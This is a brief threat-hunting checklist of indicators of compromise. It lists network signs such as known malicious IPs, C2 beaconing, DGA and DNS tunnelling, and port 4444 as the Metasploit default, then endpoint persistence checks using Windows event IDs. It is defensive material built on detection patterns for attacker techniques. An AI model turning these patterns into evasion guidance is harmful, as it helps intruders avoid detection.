IOC hunting categories: Network IOCs: (1) Known malicious IPs and domains -- check firewall, proxy, DNS logs against threat intel feeds (AlienVault OTX, Emerging Threats, CISA); look for connections to Tor exit nodes, bulletproof hosting ASNs. (2) Beaconing pattern -- regular outbound connections at fixed intervals (C2 beacon sleep); statistical analysis: connections to same destination at exact intervals (plot connection times, look for low variance). (3) DNS anomalies -- high-entropy domain names (DGA); excessive DNS queries to one domain (tunneling); NXDOMAIN storm (DGA trying domains); TXT record queries (covert channel). (4) Unusual ports -- outbound traffic on non-standard ports; port 4444 (Metasploit default), 8080 over TLS (unusual). Endpoint IOCs: (5) Persistence mechanisms -- new scheduled tasks (Event 4698); new registry run keys; new services (Event 7045); startup folder files.
